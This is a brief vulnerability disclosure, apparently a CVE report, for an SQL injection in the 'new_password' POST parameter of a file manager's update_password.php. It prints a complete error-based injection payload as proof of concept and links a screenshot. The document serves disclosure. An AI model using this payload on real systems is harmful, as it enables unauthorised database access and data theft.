BUG_Author:GZR1

Vulnerability File: /file_manager/register/update_password.php

POST parameter 'new_password' exists SQL injection vulnerability

Payload: new_password=1' and (select 2 from(select count(*),concat(0x712627287273,(select (elt(3=3,1))),0x616263,floor(rand(0)*2))x from information_schema.plugins group by x)x)-- x

Error-based sql injection is successful, proving that there is a sql injection vulnerability

![image](https://github.com/GZRsecurity/cve/blob/main/sql.png)
